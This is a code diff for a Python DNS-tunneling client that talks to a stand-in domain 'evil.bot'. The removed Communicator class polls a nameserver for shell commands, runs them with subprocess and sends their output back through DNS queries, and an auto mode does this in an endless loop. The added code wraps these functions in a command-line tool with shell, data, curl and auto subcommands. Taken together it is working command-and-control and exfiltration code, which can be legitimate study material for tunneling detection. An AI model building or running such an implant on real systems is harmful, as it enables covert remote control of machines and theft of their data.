@@ -1,165 +1,106 @@
-import dns.message
-import dns.flags
-import dns.query
-import dns.name
-import dns.rdatatype
-import dns.resolver
-import subprocess
-from time import sleep
-from client_state import ClientState, ClientStateRequestHandler, ClientStateResponseHandler, ClientStateReader, \
-    StateEnum
+import click
+from dataclasses import dataclass
+from typing import Optional
+from client_state import ClientState
+from communicator import Communicator, AutoCommunicator
+
+IS_LIVE = False
 
 
-class Communicator:
-
-    def __init__(self, client_state: ClientState, domain: str, name_server: str, request_lag_seconds: int = 1):
-        self._name_server = name_server
-        self._response_handler = ClientStateResponseHandler(client_state)
-        self._request_handler = ClientStateRequestHandler(client_state, domain)
-        self._state_reader = ClientStateReader(client_state)
-        self._request_lag_seconds = request_lag_seconds
-
-    def request_id(self):
-        query = self._request_handler.request_id()
-        response = dns.query.udp(query, self._name_server)
-        r_type, [data] = self.unpack_response(response)
-        self._response_handler.client_id(client_id=int(data[data.rindex(b'.') + 1:]))
-
-    def poll(self, auto_respond=False) -> str:
-        query = self._request_handler.poll()
-        response = dns.query.udp(query, self._name_server)
-        _, data = self.unpack_response(response)
-
-        match data:
-            case [b"DATA", data]:
-                self._response_handler.data(data, done=False)
-                return self._continue()
-            case [b"SHELL", data]:
-                self._response_handler.command(data, done=False)
-                command = self._continue()
-                if auto_respond:
-                    self.shell(command)
-                    return f"EXECUTED: {command}"
-                else:
-                    return command
-            case [b"NOTHING"]:
-                if self._state_reader.read_state() == StateEnum.RECEIVING_DATA:
-                    self._response_handler.data(b"", done=True)
-                    return self._state_reader.read_latest_data()
-                elif self._state_reader.read_state() == StateEnum.RECEIVING_SHELL:
-                    return self._response_handler.command(b"", done=True)
-                else:
-                    return "NOTHING TO DO"
-
-    def curl(self, webpage: str) -> str:
-        query, done = self._request_handler.curl(webpage)
-        response = dns.query.udp(query, self._name_server)
-
-        if not done:
-            response = self._continue_last_request()
-
-        _, data = self.unpack_response(response)
-
-        while data[0] != b"NOTHING":
-            self._response_handler.data(data[1], done=False)
-            query = self._request_handler.continue_request()
-            response = dns.query.udp(query, self._name_server)
-
-            _, data = self.unpack_response(response)
-
-        self._response_handler.data(b"", done=True)
-
-        return self._state_reader.read_latest_data()
-
-    def data(self, head: str, body: str):
-        # send head
-        query, done = self._request_handler.data(head, True)
-        dns.query.udp(query, self._name_server)
-
-        if not done:
-            self._continue_last_request()
-
-        # send body
-        query, done = self._request_handler.data(body, False)
-        dns.query.udp(query, self._name_server)
-
-        if not done:
-            self._continue_last_request()
-
-    def shell(self, command: str):
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
-        data = process.communicate()[0].decode('utf-8')
-
-        self.data(head=command, body=data)
-
-    def _continue(self) -> str:
-        if self._request_lag_seconds:
-            sleep(self._request_lag_seconds)
-
-        query = self._request_handler.continue_request()
-        response = dns.query.udp(query, self._name_server)
-        _, data = self.unpack_response(response)
-
-        match data:
-            case [b"DATA", data]:
-                self._response_handler.data(data, done=False)
-                return self._continue()
-            case [b"SHELL", data]:
-                self._response_handler.command(data, done=False)
-                return self._continue()
-            case [b"NOTHING"]:
-                if self._state_reader.read_state() == StateEnum.RECEIVING_DATA:
-                    self._response_handler.data(b"", done=True)
-                    return self._state_reader.read_latest_data()
-                elif self._state_reader.read_state() == StateEnum.RECEIVING_SHELL:
-                    return self._response_handler.command(b"", done=True)
-
-    def _continue_last_request(self) -> dns.message.Message:
-        done = False
-        while not done:
-            if self._request_lag_seconds:
-                sleep(self._request_lag_seconds)
-            query, done = self._request_handler.continue_last_request()
-            response = dns.query.udp(query, self._name_server)
-
-        return response
-
-    @staticmethod
-    def unpack_response(response: dns.message.Message) -> tuple[dns.rdatatype, list[bytes]]:
-        answer = response.answer[0]
-        response_type = dns.rdatatype.to_text(answer.rdtype)
-
-        response_data = list(answer.items.keys())[0]
-
-        if response_type == dns.rdatatype.A.name:
-            return response_type, [response_data.address.encode('utf-8')]
-        elif response_type == dns.rdatatype.TXT.name:
-            return response_type, response_data.strings
-        else:
-            raise ValueError(f"RESPONSE TYPE {response_type} not supported")
+@click.group()
+@click.option('--nameserver', type=str, default='127.0.0.1', show_default=True, help="IP-Address of the nameserver.")
+@click.option('--domain', type=str, default='evil.bot', show_default=True, help="Domain name of the target server.")
+@click.option('--lag', type=click.IntRange(min=0), default=0, help="Number of seconds between chained requests.")
+@click.option('--id', 'client_id', type=int, help="Set the id of the client (otherwise a new id gets requested for every command).")
+@click.option('--live', is_flag=True, help="Activate Live display of data (otherwise final response gets printed).")
+@click.pass_context
+def main(ctx, nameserver: str, domain: str, lag: int, client_id: Optional[int], live: bool):
+    """
+    DNS-Tunneling Client.
+    """
+    global IS_LIVE
+    IS_LIVE = live
+    ctx.obj = Communicator(client_state=ClientState(), domain=domain, name_server=nameserver, client_id=client_id,
+                           request_lag_seconds=lag)
 
 
-class AutoCommunicator:
-
-    def __init__(self, communicator: Communicator, poll_seconds: int):
-        self._communicator = communicator
-        self._poll_seconds = poll_seconds
-
-        self._communicator.request_id()
-
-        while True:
-            response = self._communicator.poll(auto_respond=True)
-            print(response)
-            sleep(self._poll_seconds)
+@main.command(name='id')
+@click.pass_obj
+def request_id_command(comm: Communicator):
+    """
+    Requests new Client ID.
+    """
+    client_id = comm.request_id()
+    if not IS_LIVE:
+        click.echo(client_id)
 
 
-def main():
-    name_server = '127.0.0.1'
-    domain = 'evil.bot'
+@main.command()
+@click.option('--auto-respond', 'auto_respond', is_flag=True, help="Automatically respond to poll response.")
+@click.pass_obj
+def poll(comm: Communicator, auto_respond: bool):
+    """
+    Polls the next Command/Data from the server.
 
-    client_state = ClientState()
-    comm = Communicator(client_state=client_state, domain=domain, name_server=name_server, request_lag_seconds=1)
-    auto_comm = AutoCommunicator(comm, poll_seconds=10)
+    If AUTO-RESPOND is set, the client automatically executes command, when he gets one.
+    """
+    response = comm.poll(auto_respond=auto_respond)
+    if not IS_LIVE:
+        click.echo(response)
+
+
+# @main.command(name='continue')
+# @click.pass_obj
+# def continue_command(comm: Communicator):
+#     pass
+
+@main.command()
+@click.option('--head', type=str, required=True, help="The header for the data (can be anything e.g. the filename).")
+@click.option('--body', type=str, required=True, help="The data that should be send to the server.")
+@click.pass_obj
+def data(comm: Communicator, head: str, body: str):
+    """
+    Sends data to the target server.
+    """
+    response = comm.data(head=head, body=body.encode('utf-8').decode('unicode_escape'))
+    if not IS_LIVE:
+        click.echo(response)
+
+
+@main.command()
+@click.option('--webpage', type=str, required=True, help="The requested webpage.")
+@click.pass_obj
+def curl(comm: Communicator, webpage: str):
+    """
+    Requests a get requests for WEBPAGE from the target server.
+    """
+    response = comm.curl(webpage=webpage)
+    if not IS_LIVE:
+        click.echo(response)
+
+
+@main.command()
+@click.option('--command', type=str, required=True, help="The shell command that should be executed.")
+@click.pass_obj
+def shell(comm: Communicator, command: str):
+    """
+    Executes the shell command COMMAND and send the result to the target server.
+    """
+    response = comm.shell(command=command)
+    if not IS_LIVE:
+        click.echo(response)
+
+
+@main.command()
+@click.option('--poll', '--poll-seconds', 'poll_sec', type=click.IntRange(min=0), default=10, help="Number of seconds between each poll.")
+@click.pass_obj
+def auto(comm: Communicator, poll_sec: int):
+    """
+    Autonomously poll from and respond to the target server.
+
+    Autonomously poll the target server every POLL seconds and respond accordingly.
+    """
+    AutoCommunicator(comm, poll_seconds=poll_sec)
 
 
 if __name__ == '__main__':
